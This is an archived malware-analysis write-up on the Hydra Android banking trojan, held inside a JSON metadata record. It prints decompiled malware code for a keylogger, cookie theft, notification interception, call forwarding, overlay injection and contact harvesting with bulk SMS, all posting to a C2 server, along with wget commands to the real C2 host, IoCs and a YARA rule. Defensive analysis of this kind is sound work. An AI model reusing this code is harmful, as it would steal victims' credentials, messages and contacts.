{
    "id": "2ea7c44f-a73d-4fce-bde4-cdbcba560654",
    "created_at": "2023-01-12T15:01:48.675896Z",
    "updated_at": "2025-03-27T02:06:00.294068Z",
    "deleted_at": null,
    "sha1_hash": "5b4b77f66424cf3210f2d3dcfda4da9aa2ed4f4a",
    "title": "2022-09-21 - Technical analysis of Hydra android malware",
    "authors": "",
    "file_creation_date": "2022-10-02T12:19:45Z",
    "file_modification_date": "2022-10-02T12:19:45Z",
    "file_size": 2364566,
    "plain_text": "# Technical analysis of Hydra android malware\n\n**muha2xmad.github.io/malware-analysis/hydra/**\n\n\nSeptember 20, 2022\n\n\n-----\n\n-----\n\n### Muhammad Hasan Ali\n\n#### Malware Analysis learner\n\n 11 minute read\n\n بسم اهلل الرحمن الرحيم\n\n## Unpacking\n\n#### If we unzip the sample and explore the AndroidManifest.xml, we see that the entry point\n```\ncom.sdktools.android.MainActivity is not found in the code of the sample. This an\n\n indication of a packed sample. You can identify the packing technique using droidlysis or APKiD. If we use droidlysis, We can see the it the sample uses DexClassLoader, malware uses JsonPacker packer. So we need to get the decrypted payload of the sample. We will use Frida to get the decrypted payload. We will install the sample on the Android studio as an emulator and by using WSL on my host we will launch Frida to start the malicous APP to get the payload. Then we pull the payload to our host from the emulator.\n\n```\n\n-----\n\n#### Figure(1) KCFj.json is our decrypted payload\n\n## Anti-emulator\n\n#### I tried to run the sample in the emulator such as android studio and intercept the traffic between the malware and the C2 server with Burp suite . But It didn’t go as well as my last analysis of a previous sample of Hydra on my twitter. Then I used our magic tool droidlysis to get the Properties of the payload KCFj.json . I see the payload is checking if there’s an qemu emulator.\n\n Figure(2) droidlysis result for qemu detection in sample code\n\n Then I used APKiD tool to get more details of the anti-emulation technique’s code.\n\n\n-----\n\n#### Figure(3) APKiD result for anti-vm detection in sample code\n\n We get the sample code for detecting VM, in SdkManagerImpl class located in\n```\ncom.sdktools.android.bot . If one of these checks is true, then i guess the malware will\n\n act differently. The malware won’t communicate with the C2 server to get the targeted APPs to perform the Overlay attack or to get the mirrors/domains . We will see.\nprivate static boolean isEmulator() {\n\n    return (Build.BRAND.startsWith(\"generic\")) &&\n(Build.DEVICE.startsWith(\"generic\")) || (Build.FINGERPRINT.startsWith(\"generic\")) ||\n(Build.FINGERPRINT.startsWith(\"unknown\")) || (Build.HARDWARE.contains(\"goldfish\")) ||\n(Build.HARDWARE.contains(\"ranchu\")) || (Build.MODEL.contains(\"google_sdk\")) ||\n(Build.MODEL.contains(\"Emulator\")) || (Build.MODEL.contains(\"Android SDK built for\nx86\")) || (Build.MANUFACTURER.contains(\"Genymotion\")) ||\n(Build.PRODUCT.contains(\"sdk_google\")) || (Build.PRODUCT.contains(\"google_sdk\")) ||\n(Build.PRODUCT.contains(\"sdk\")) || (Build.PRODUCT.contains(\"sdk_x86\")) ||\n(Build.PRODUCT.contains(\"vbox86p\")) || (Build.PRODUCT.contains(\"emulator\")) ||\n(Build.PRODUCT.contains(\"simulator\"));\n\n  }\n\n\n## Solution\n\n#### When I counter a sample uses anti-emulation techniques, I use tria.ge to get the traffic between the malware and the C2 server. If you go to the previous link, you will find the communication between the malware and the C2 server. You can download the files using\nwget + link such as wget http://lalabanda.com/payload .\n\n```\n\n-----\n\n#### Figure(4) Communication between C2 and the malware\n\n When we download mirrors file from http://lalabanda.com/api/mirrors, we will find encoded domains. I guess when the main C2 server is down, the malware will communicate with the mirrors or domains that we downloaded. You can find these donmains in the IoCs section.\n\n Then we see a zip file called jk5xWNYPKnTh4e7LP6vPG8z4YiBmoQYtKefRNId1.zip which we can download from\n```\nhttp://lalabanda.com/storage/zip/jk5xWNYPKnTh4e7LP6vPG8z4YiBmoQYtKefRNId1.zip .\n\n After downloading the file and unzip it, we see it contains two folders. First contains icons and the second is inj which contains 360 folders named with the targeted APPs. Inside the folders located in inj folder, there are the html files which will be used in the\n\n```\n\n-----\n\n#### Figure(5) targeted apps which contains html files to perform overlay attack\n\n## Premium services\n\n#### The malware will try to subscribe to a premium service without the knowledge of the user which will charge the SIM more money.\n\n\n-----\n\n```\nprivate void launchUssdCode(Context context0, String s) throws Exception {\n\n    this.ussdCalledTimeInMs = System.currentTimeMillis();\n    Timber.d(\"log -> [%s]\", new Object[]{s});\n\n    Intent intent0 = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" +\ns.replaceAll(\"#\", Uri.encode(\"#\"))));\n\n    intent0.addFlags(0x10000000);\n\n    intent0.addFlags(0x20000000);\n\n    context0.startActivity(intent0);\n\n  }\n\n  public boolean onAccessibilityEvent(InjAccessibilityService\ninjAccessibilityService0, AccessibilityEvent accessibilityEvent0, String s) {\n\n    if(accessibilityEvent0 != null && accessibilityEvent0.getSource() != null &&\n(s.equalsIgnoreCase(\"com.android.phone\")) &&\n(accessibilityEvent0.getClassName().toString().toLowerCase().contains(\"dialog\")) &&\n!accessibilityEvent0.getText().isEmpty()) {\n\n      StringBuilder stringBuilder0 = new StringBuilder();\n\n      for(Object object0: accessibilityEvent0.getText()) {\n\n        stringBuilder0.append(\" | \");\n\n        stringBuilder0.append(((CharSequence)object0));\n\n      }\n\n      UssdComponent.sendPhoneNumber(stringBuilder0.toString());\n\n    }\n\n    return false;\n\n  }\n\n## Steal cookies\n\n#### The malware will try to steal Cookies from APPs such as Facebook and google .\n\n```\n\n-----\n\n```\npublic class CookiesReaderViewerActivityInterfaceImpl extends IScreen {\n\n  public interface LifeCycleListener {\n\n    boolean onPause();\n\n    boolean onResume();\n\n  }\n\n  private InjectCookiesModel cookieModel;\n\n  private LifeCycleListener lifeCycleListener;\n\n  private WebView webView;\n\n  public CookiesReaderViewerActivityInterfaceImpl(InjectCookiesModel\ninjectCookiesModel0) {\n\n    this.cookieModel = injectCookiesModel0;\n\n  }\n\n  public CookiesReaderViewerActivityInterfaceImpl(InjectCookiesModel\ninjectCookiesModel0, LifeCycleListener\ncookiesReaderViewerActivityInterfaceImpl$LifeCycleListener0) {\n\n    this.cookieModel = injectCookiesModel0;\n\n    this.lifeCycleListener =\ncookiesReaderViewerActivityInterfaceImpl$LifeCycleListener0;\n\n  }\n\n  private void handleData(Activity activity0) {\n\n    try {\n\n      this.webView.clearView();\n\n      String s = this.cookieModel.getFirstScreen();\n\n      this.webView.loadUrl(s);\n\n      Timber.d(\"INJECTS -> display file: \" + s, new Object[0]);\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n  private void init() {\n\n    this.webView.getSettings().setDomStorageEnabled(true);\n\n    this.webView.getSettings().setMixedContentMode(0);\n\ncom.sdktools.android.bot.components.injects.system.CookiesReaderViewerActivityInterfac\n cookiesReaderViewerActivityInterfaceImpl$10 = new WebViewClient() {\n\n      @Override // android.webkit.WebViewClient\n\n      public void onPageFinished(WebView webView0, String s) {\n\n        super.onPageFinished(webView0, s);\n\nif(s.contains(CookiesReaderViewerActivityInterfaceImpl.this.cookieModel.getScreenToFin\n {\n          String s1 = CookieManager.getInstance().getCookie(s);\n\n          StringBuilder stringBuilder0 = new StringBuilder();\n\n          stringBuilder0.append(\"print event:\");\n\nstringBuilder0.append(CookiesReaderViewerActivityInterfaceImpl.this.cookieModel.getFir\n\n```\n\n-----\n\n```\n + cookies data | \\n );\n\nstringBuilder0.append(CookieManager.getInstance().getCookie(CookiesReaderViewerActivit\n\n          stringBuilder0.append(\"   \\n\");\n\n          stringBuilder0.append(\"   \\n\");\n\nstringBuilder0.append(CookiesReaderViewerActivityInterfaceImpl.this.cookieModel.getScr\n + \" cookies data | \\n\");\n\nstringBuilder0.append(CookieManager.getInstance().getCookie(CookiesReaderViewerActivit\n\n          stringBuilder0.append(s1);\n\n          if(!TextUtils.isEmpty(stringBuilder0)) {\n\n            String s2 =\nCookiesReaderViewerActivityInterfaceImpl.this.cookieModel.getApplicationId();\n\nInjectComponent.get().getConfigsProvider().getInjectHandler().handleWebViewLog(Cookies\n s2, stringBuilder0.toString());\n\n          }\n\n        }\n\n      }\n\n      @Override // android.webkit.WebViewClient\n\n      public boolean shouldOverrideUrlLoading(WebView webView0, String s) {\n\n        Timber.d(\"INJECTS -> ulr loaded: \" + s, new Object[0]);\n\n        webView0.loadUrl(s);\n\n        return true;\n\n      }\n\n    };\n\n    this.webView.getSettings().setJavaScriptEnabled(true);\n\n    this.webView.getSettings().setAllowFileAccess(true);\n\n    this.webView.getSettings().setSaveFormData(true);\n\n    this.webView.getSettings().setAppCacheEnabled(false);\n    this.webView.getSettings().setCacheMode(2);\n\n    this.webView.setBackgroundColor(0);\n\n    this.webView.setWebViewClient(cookiesReaderViewerActivityInterfaceImpl$10);\n\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n  public void onCreate(Activity activity0) {\n\n    FrameLayout frameLayout0 = new FrameLayout(activity0);\n\n    frameLayout0.setBackgroundColor(-1);\n\n    WebView webView0 = new WebView(activity0);\n\n    this.webView = webView0;\n\n    frameLayout0.addView(webView0, new FrameLayout.LayoutParams(-1, -1));\n\n    activity0.setContentView(frameLayout0);\n\n    this.init();\n\n    this.handleData(activity0);\n\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n```\n\n-----\n\n```\n  public void onPause(Activity activity0) {\n\n    InjectComponent.viewerActivityVisible = false;\n\n    LifeCycleListener cookiesReaderViewerActivityInterfaceImpl$LifeCycleListener0\n= this.lifeCycleListener;\n\n    if(cookiesReaderViewerActivityInterfaceImpl$LifeCycleListener0 != null) {\n\n      cookiesReaderViewerActivityInterfaceImpl$LifeCycleListener0.onPause();\n\n    }\n\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n  public void onResume(Activity activity0) {\n\n    InjectComponent.viewerActivityVisible = true;\n\n    LifeCycleListener cookiesReaderViewerActivityInterfaceImpl$LifeCycleListener0\n= this.lifeCycleListener;\n\n    if(cookiesReaderViewerActivityInterfaceImpl$LifeCycleListener0 != null) {\n\n      cookiesReaderViewerActivityInterfaceImpl$LifeCycleListener0.onResume();\n\n    }\n\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n  public void onStop(Activity activity0) {\n\n    super.onStop(activity0);\n\n    activity0.finish();\n\n  }\n\n\n## Keylogger\n\n#### The malware has the ability to keylog what the user enters such as password or any\nedittext contains a hint . Then send keylogging to the C2 server.\n\n```\n\n-----\n\n```\n if(accessibilityEvent0.isPassword()) {\n\n        if(!s1.contains(\"•\") && !s1.contains(\"*\")) {\n\n          keyLoggerModel0.setText(s1);\n\n          return false;\n\n        }\n\n        if(s1.equals(accessibilityEvent0.getSource().getHintText())) {\n\n          keyLoggerModel0.setText(\"\");\n\n          return false;\n\n        }\n\n        int v = keyLoggerModel0.getText().length();\n\n        if(s1.length() > v) {\n\nkeyLoggerModel0.addToText(Character.toString(((char)s1.charAt(s1.length() - 1))));\n\n          return false;\n\n        }\n\n        keyLoggerModel0.removeLastFromText();\n\n        return false;\n\n      }\n\n      keyLoggerModel0.setText(s1);\n\n    }\n\n    return false;\n\n  }\n\n  @Override // com.sdktools.android.bot.SdkComponent\n\n  public void onSyncEvent(JsonObject jsonObject0) {\n\n    super.onSyncEvent(jsonObject0);\n\n    Boolean boolean0 = JsonUtils.hasObject(jsonObject0, \"enable_keylogger\") ?\nBoolean.valueOf(jsonObject0.get(\"enable_keylogger\").getAsBoolean()) : null;\n\n    if(boolean0 != null) {\n\n      SharedPrefHelper.setIsKeyLoggerEnabled(this.context(),\nboolean0.booleanValue());\n\n    }\n\n  }\n\n  public void onWindowStateChanged() {\n\n    if(this.candidateToPass.size() > 0) {\n\n      this.isRequestInProgress.set(true);\n\n      Log.d(\"!!!!!\", \" SEND DATA TO SERVER \" + this.candidateToPass);\n\n      KeyLoggerModel keyLoggerModel0 =\n(KeyLoggerModel)this.candidateToPass.get(0);\n\n      HashMap hashMap0 = new HashMap();\n\n      hashMap0.put(\"messages\", this.candidateToPass);\n\n      this.api().makePost(\"device/kl\", hashMap0).enqueue(new RestCallback() {\n\n        @Override // com.sdktools.android.bot.rest.RestCallback\n\n        public void onError(Throwable throwable0) {\n\n          KeyLoggerComponent.this.isRequestInProgress.set(false);\n\n        }\n\n```\n\n-----\n\n```\n        @Override // com.sdktools.android.bot.rest.RestCallback\n\n        public void onSuccess(RestResponse restResponse0) {\n\n          KeyLoggerComponent.this.candidateToPass.clear();\n\n          KeyLoggerComponent.this.isRequestInProgress.set(false);\n\n        }\n\n      });\n\n    }\n\n  }\n\n\n## Classic Features\n\n Notification intercepting\n\n#### The malware will try to intercept notification using onNotificationPosted callback located in com.sdktools.android.bot.components.commands . The malware will intercept the comming notifications and hide them from the user. Then push/upload the content of the notification to the C2 server.\n\n```\n\n-----\n\n```\n public void onNotificationPosted(StatusBarNotification statusBarNotification0) {\n\n    Log.i(this.TAG, \"********** onNotificationPosted\");\n\n    if(SharedPrefHelper.getIsHiddenPushEnabled(this)) {\n\n      this.cancelNotification(statusBarNotification0.getKey());\n\n    }\n\n    Notification notification0 = statusBarNotification0.getNotification();\n\n    String s = notification0.extras.getString(\"android.title\");\n\n    String s1 = notification0.extras.getString(\"android.text\");\n\n    Timber.d(\"!!!!!\", new Object[]{\"title - \" + s + \" | description - \" + s1 + \"\n| app - \" + statusBarNotification0.getPackageName()});\n\n    String s2 = \"Title - \" + s + \"\\nDescription - \" + s1;\n\n    try {\n\n      this.sendNotification(statusBarNotification0.getPackageName(), s2);\n\n    }\n\n    catch(Exception unused_ex) {\n\n      return;\n\n    }\n\n    Timber.d(\"!!!!!\", new Object[]{\"cancel notification. Hidden\"});\n\n  }\n\n  @Override // android.service.notification.NotificationListenerService\n\n  public void onNotificationRemoved(StatusBarNotification statusBarNotification0) {\n\n    Timber.d(\"!!!!!\", new Object[]{\"********** onNOtificationRemoved\"});\n\n  }\n\n  private void sendNotification(String s, String s1) {\n\n    HashMap hashMap0 = new HashMap();\n\n    hashMap0.put(\"appId\", s);\n\n    hashMap0.put(\"text\", s1);\n\n    try {\n\n      if(LockerComponent.get() != null && LockerComponent.get().api() != null)\n{\n\n        LockerComponent.get().api().makePost(\"device/push\",\nhashMap0).enqueue(new RestCallback() {\n\n          @Override // com.sdktools.android.bot.rest.RestCallback\n\n          public void onError(Throwable throwable0) {\n\n          }\n\n          @Override // com.sdktools.android.bot.rest.RestCallback\n\n          public void onSuccess(RestResponse restResponse0) {\n\n          }\n\n        });\n\n      }\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n\n## Call Forwarding\n\n```\n\n-----\n\n#### The malware can intercept calls and forward calls when the user get a phone call.\n\n\n-----\n\n```\n  public boolean onAccessibilityEvent(InjAccessibilityService\ninjAccessibilityService0, AccessibilityEvent accessibilityEvent0, String s) {\n\n    int v1;\n\n    Log.d(\"OwnAccessibilityService\", \"onAccessibilityEvent -> \" +\naccessibilityEvent0);\n\n    Boolean boolean0 = Boolean.valueOf(false);\n\n    if(accessibilityEvent0.getEventType() != 0x20) {\n\n      return false;\n\n    }\n\nif(accessibilityEvent0.getClassName().equals(\"com.android.phone.settings.SimPickerPref\n {\n      if(accessibilityEvent0.getSource() == null) {\n\n        return false;\n\n      }\n\n      this.isSecondSimActive = true;\n\n      AccessibilityNodeInfo accessibilityNodeInfo0 =\ninjAccessibilityService0.findAndGetFirstSimilar(accessibilityEvent0.getSource(),\n\"com.android.phone:id/recycler_view\", true);\n\n      if(this.currentSim == SimCard.Sim1) {\n\ninjAccessibilityService0.performClick(accessibilityNodeInfo0.getChild(0), \"f\");\n\n        return false;\n\n      }\n\n      if(this.currentSim == SimCard.Sim2) {\n\ninjAccessibilityService0.performClick(accessibilityNodeInfo0.getChild(1), \"f\");\n\n        return false;\n\n      }\n\n    }\n\n    else\nif(accessibilityEvent0.getClassName().equals(\"com.android.phone.settings.GsmUmtsCallFo\n {\n      if(accessibilityEvent0.getSource() != null) {\n\n        this.tryToClickXiaomiCallForwardingButton(injAccessibilityService0,\naccessibilityEvent0);\n\n        return false;\n\n      }\n\n      int v = 0;\n\n      while(v <= 40) {\n\n        if(v % 5 == 0) {\n\ninjAccessibilityService0.performClick(injAccessibilityService0.getRootInActiveWindow()\n \"\");\n\n        }\n\n        try {\n\n```\n\n-----\n\n```\n          Thread.sleep(1000L);\n\n          if(injAccessibilityService0.getRootInActiveWindow() != null) {\n\n            injAccessibilityService0.getRootInActiveWindow().refresh();\n          }\n\n          boolean z =\nthis.tryToClickXiaomiCallForwardingButton(injAccessibilityService0,\naccessibilityEvent0);\n\n        }\n\n        catch(InterruptedException unused_ex) {\n\n          return;\n\n        }\n\n        if(z) {\n\n          return true;\n\n        }\n\n        ++v;\n\n        continue;\n\n        this.tryToClickXiaomiCallForwardingButton(injAccessibilityService0,\naccessibilityEvent0);\n\n        return false;\n\n      }\n\n    }\n\n## Overlay attack\n\n#### As we see the malware will download a zip file contains html files of the targeted apps. If a targeted APP is opened then the malware will launch the html file of the targeted app. Located in com.sdktools.android.bot.components.injects.system .\n\n```\n\n-----\n\n```\npublic class ViewerActivityInterfaceImpl extends IScreen {\n\n  public interface LifeCycleListener {\n\n    boolean onPause();\n\n    boolean onResume();\n\n  }\n\n public ViewerActivityInterfaceImpl(InjectModel injectModel0) {\n\n    this.injectModel = injectModel0;\n\n  }\n\n  public ViewerActivityInterfaceImpl(InjectModel injectModel0, LifeCycleListener\nviewerActivityInterfaceImpl$LifeCycleListener0) {\n\n    this.injectModel = injectModel0;\n\n    this.lifeCycleListener = viewerActivityInterfaceImpl$LifeCycleListener0;\n\n  }\n\n  private void handleData(Activity activity0) {\n\n    try {\n\n      this.webView.clearView();\n\n      String s = this.injectModel.getInjectPath();\n\n      s = s.startsWith(\"http\") ? this.injectModel.getInjectPath() : \"file:///\"\n+ s;\n\n      this.webView.loadUrl(s);\n\n      Timber.d(\"INJECTS -> display file: \" + s, new Object[0]);\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n  private void init() {\n\n    this.webView.getSettings().setDomStorageEnabled(true);\n\n    if(Build.VERSION.SDK_INT >= 21) {\n\n      this.webView.getSettings().setMixedContentMode(0);\n\n    }\n\ncom.sdktools.android.bot.components.injects.system.ViewerActivityInterfaceImpl.1\nviewerActivityInterfaceImpl$10 = new WebChromeClient() {\n\n      @Override // android.webkit.WebChromeClient\n\n      public boolean onConsoleMessage(ConsoleMessage consoleMessage0) {\n\n        String s = consoleMessage0.message();\n\n        if(!TextUtils.isEmpty(s)) {\n\n          String s1 =\nViewerActivityInterfaceImpl.this.injectModel.getApplicationId();\n\nInjectComponent.get().getConfigsProvider().getInjectHandler().handleWebViewLog(ViewerA\n s1, s);\n\n        }\n\n        return super.onConsoleMessage(consoleMessage0);\n\n      }\n\n```\n\n-----\n\n```\n    };\n\ncom.sdktools.android.bot.components.injects.system.ViewerActivityInterfaceImpl.2\nviewerActivityInterfaceImpl$20 = new WebViewClient() {\n\n      @Override // android.webkit.WebViewClient\n\n      public boolean shouldOverrideUrlLoading(WebView webView0, String s) {\n\n        Timber.d(\"INJECTS -> ulr loaded: \" + s, new Object[0]);\n\n        webView0.loadUrl(s);\n\n        return true;\n\n      }\n\n    };\n\n    this.webView.getSettings().setJavaScriptEnabled(true);\n\n    this.webView.getSettings().setLoadWithOverviewMode(true);\n\n    this.webView.getSettings().setAllowFileAccess(true);\n\n    this.webView.getSettings().setSaveFormData(true);\n\n    this.webView.getSettings().setAppCacheEnabled(false);\n    this.webView.getSettings().setCacheMode(2);\n\n    this.webView.setBackgroundColor(0);\n\n    this.webView.setWebViewClient(viewerActivityInterfaceImpl$20);\n\n    this.webView.setWebChromeClient(viewerActivityInterfaceImpl$10);\n\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n  public void onCreate(Activity activity0) {\n\n    FrameLayout frameLayout0 = new FrameLayout(activity0);\n\n    frameLayout0.setBackgroundColor(-1);\n\n    WebView webView0 = new WebView(activity0);\n\n    this.webView = webView0;\n\n    frameLayout0.addView(webView0, new FrameLayout.LayoutParams(-1, -1));\n\n    activity0.setContentView(frameLayout0);\n\n    this.init();\n\n    this.handleData(activity0);\n\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n  public void onPause(Activity activity0) {\n\n    InjectComponent.viewerActivityVisible = false;\n\n    LifeCycleListener viewerActivityInterfaceImpl$LifeCycleListener0 =\nthis.lifeCycleListener;\n\n    if(viewerActivityInterfaceImpl$LifeCycleListener0 != null) {\n\n      viewerActivityInterfaceImpl$LifeCycleListener0.onPause();\n\n    }\n\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n  public void onResume(Activity activity0) {\n\n    InjectComponent.viewerActivityVisible = true;\n\n    LifeCycleListener viewerActivityInterfaceImpl$LifeCycleListener0 =\nthis.lifeCycleListener;\n\n    if(viewerActivityInterfaceImpl$LifeCycleListener0 != null) {\n\n      viewerActivityInterfaceImpl$LifeCycleListener0.onResume();\n\n    }\n\n```\n\n-----\n\n```\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n  public void onStop(Activity activity0) {\n\n    super.onStop(activity0);\n\n    activity0.finish();\n\n  }\n\n  @Override // com.sdktools.android.core.injects_core.IScreen\n\n  public boolean overrideBackPress(Activity activity0) {\n\n    return true;\n\n  }\n\n  private void startAppById(Context context0, String s) {\n\n    try {\n\ncontext0.startActivity(context0.getPackageManager().getLaunchIntentForPackage(s));\n\n    }\n\n    catch(ActivityNotFoundException unused_ex) {\n\n    }\n\n  }\n\n}\n\n## Steal contacts\n\n#### The malware collect the contacts stored in the victim’s device and send it to C2 server. And smishing the stolen numbers.\n\n```\n\n-----\n\n```\npublic static ContactsComponent get() {\n\n    return ContactsComponent.instance;\n\n  }\n\n  private List getContactList() {\n\n    ArrayList arrayList0 = new ArrayList();\n\n    ContentResolver contentResolver0 = this.context().getContentResolver();\n\n    Cursor cursor0 =\ncontentResolver0.query(ContactsContract.Contacts.CONTENT_URI, null, null, null,\nnull);\n\n    if((cursor0 == null ? 0 : cursor0.getCount()) > 0) {\n\n      while(cursor0 != null && (cursor0.moveToNext())) {\n\n        String s = cursor0.getString(cursor0.getColumnIndex(\"_id\"));\n\n        cursor0.getString(cursor0.getColumnIndex(\"display_name\"));\n\n        if(cursor0.getInt(cursor0.getColumnIndex(\"has_phone_number\")) <= 0) {\n\n          continue;\n\n        }\n\n        Cursor cursor1 =\ncontentResolver0.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,\n\"contact_id = ?\", new String[]{s}, null);\n\n        while(cursor1.moveToNext()) {\n\narrayList0.add(cursor1.getString(cursor1.getColumnIndex(\"data1\")));\n\n        }\n\n        cursor1.close();\n\n      }\n\n    }\n\n    if(cursor0 != null) {\n\n      cursor0.close();\n\n    }\n\n    return arrayList0;\n\n  }\n\n  @Override // android.app.LoaderManager$LoaderCallbacks\n\n  public Loader onCreateLoader(int v, Bundle bundle0) {\n\n    return v == 1 ? this.contactsLoader() : null;\n\n  }\n\n  public void onLoadFinished(Loader loader0, Cursor cursor0) {\n\n    this.contactsFromCursor(cursor0);\n\n  }\n\n  @Override // android.app.LoaderManager$LoaderCallbacks\n\n  public void onLoadFinished(Loader loader0, Object object0) {\n\n    this.onLoadFinished(loader0, ((Cursor)object0));\n\n  }\n\n  @Override // android.app.LoaderManager$LoaderCallbacks\n\n```\n\n-----\n\n```\n  public void onLoaderReset(Loader loader0) {\n\n  }\n\n  @Override // com.sdktools.android.bot.SdkComponent\n\n  public void onSyncEvent(JsonObject jsonObject0) {\n\n    super.onSyncEvent(jsonObject0);\n\n    if(1 == (JsonUtils.hasObject(jsonObject0, \"bulk_sms\") ?\njsonObject0.get(\"bulk_sms\").getAsInt() : 0)) {\n\n      String s = JsonUtils.hasObject(jsonObject0, \"bulk_body\") ?\njsonObject0.get(\"bulk_body\").getAsString() : \"\";\n\n      if(!TextUtils.isEmpty(s)) {\n\n        this.sendBulkSms(s, this.getContactList());\n\n      }\n\n    }\n\n  }\n\n  private void sendBulkSms(String s, List list0) {\n\n    for(Object object0: list0) {\n\n      this.sendSMS(((String)object0).replace(\" \", \"\"), s);\n\n      try {\n\n        Thread.sleep(300L);\n\n      }\n\n      catch(InterruptedException unused_ex) {\n\n        return;\n\n      }\n\n    }\n\n  }\n\n  public void sendSMS(String s, String s1) {\n\n    try {\n\n      SmsManager.getDefault().sendTextMessage(s, null, s1, null, null);\n\n    }\n\n    catch(Exception unused_ex) {\n\n    }\n\n  }\n\n\n## IoCs\n\n#### APK hash: 8b321553f1a269ee4b68a02162ba2d14c71a92907b6001ff3db0fe5bae6b3430\n\n Payload (KCFj.json) hash:\n\n```\n```\nfd87c4f7c8ece0448dab67a0b689c4a417a153081059750295fbed29a1422b03\n\n```\n\n#### C2 server:\n\n http://lalabanda.com\n\n Related C2 servers:\n\n http://cslon.com\n\n\n-----\n\n#### http://cariciu-carilas.com\n\n http://carilas-carilas.net\n\n http://carilas-carilas.top\n\n## Yara rule\n```\nrule Hydra {\n\n meta:\n\n  author   = \"@muha2xmad\"\n\n  date    = \"2022-09-21\"\n\n  description = \"Hydra android malware\"\n\n  version   = \"1.0\"\n\n strings:\n\n  $str00 = \"all_data.json\" nocase\n\n  $str01 = \"res/xml/tfgztcqbitzuzb.xml\" nocase\n\n  $str02 = \"res/xml/hccnqedztpvawk.xml\" nocase\n\n  $str03 = \"res/xml/bkfzwlpvqlbmlh.xml\" nocase\n\n  $str04 = \"com.wife.dizzy/shared_prefs\" nocase\n\n condition:\n\n  uint32be(0) == 0x504B0304 // APK file signature\n\n   and ( all of ($str*))\n\n}\n\n\n Article quote\n\n#### لَفَلسَت الِثياَب اَّلتي َترَتدي َوَلسَت اَألسامي اَّلتي َتحِمُل َوَلسَت الِبالَد اَّلتي َأنَبَتتَك َوَلِكَّنما َأنَت ما َتفَعُ\n\n## REF\n\n#### triage report\n\n Previous Hydra analysis\n\n droidlysis\n\n APKiD\n\n Frida\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-21 - Technical analysis of Hydra android malware.pdf"
    ],
    "report_names": [
        "2022-09-21 - Technical analysis of Hydra android malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535708,
    "ts_updated_at": 1743041160,
    "ts_creation_date": 1664713185,
    "ts_modification_date": 1664713185,
    "files": {
        "pdf": "https://archive.orkl.eu/5b4b77f66424cf3210f2d3dcfda4da9aa2ed4f4a.pdf",
        "text": "https://archive.orkl.eu/5b4b77f66424cf3210f2d3dcfda4da9aa2ed4f4a.txt",
        "img": "https://archive.orkl.eu/5b4b77f66424cf3210f2d3dcfda4da9aa2ed4f4a.jpg"
    }
}